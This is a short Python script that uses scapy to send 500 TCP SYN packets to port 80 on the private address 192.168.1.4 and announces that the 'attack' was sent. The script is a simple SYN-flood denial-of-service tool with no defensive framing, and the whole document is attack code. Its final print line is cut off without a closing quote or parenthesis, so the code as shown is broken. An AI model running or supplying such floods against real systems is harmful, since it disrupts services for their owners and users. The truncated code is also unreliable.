from scapy.all import IP, TCP, send
import time

print("🔥 Launching 500 SYN packets to port 80...")
send(IP(dst="192.168.1.4")/TCP(dport=80, flags="S"), loop=1, count=500)
time.sleep(0.5)

print("✅ Attack sent! Quickly look at Terminal